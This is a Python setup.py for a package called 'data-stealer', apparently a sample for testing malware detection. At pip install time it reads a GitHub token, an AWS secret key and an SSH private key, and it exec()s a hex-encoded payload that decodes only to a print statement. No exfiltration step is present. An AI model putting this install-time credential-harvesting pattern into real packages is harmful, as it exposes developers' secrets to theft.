"""
data-stealer v2.3.1 — setup.py
Runs malicious code at pip install time
"""

from setuptools import setup

# This runs at install time
import os, base64

# Steal env variables on install
_token = os.getenv('GITHUB_TOKEN')
_aws = os.getenv('AWS_SECRET_ACCESS_KEY')

# Open SSH config for exfiltration
try:
    with open('.ssh/id_rsa', 'r') as f:
        _key = f.read()
except Exception:
    pass

# Dynamic eval execution using hex-decoded payload
exec(bytes.fromhex('7072696e74282268656c6c6f2066726f6d206d616c6963696f75732073657475702229'))

setup(
    name="data-stealer",
    version="2.3.1",
    description="System diagnostics utility",
    py_modules=["stealer"],
)
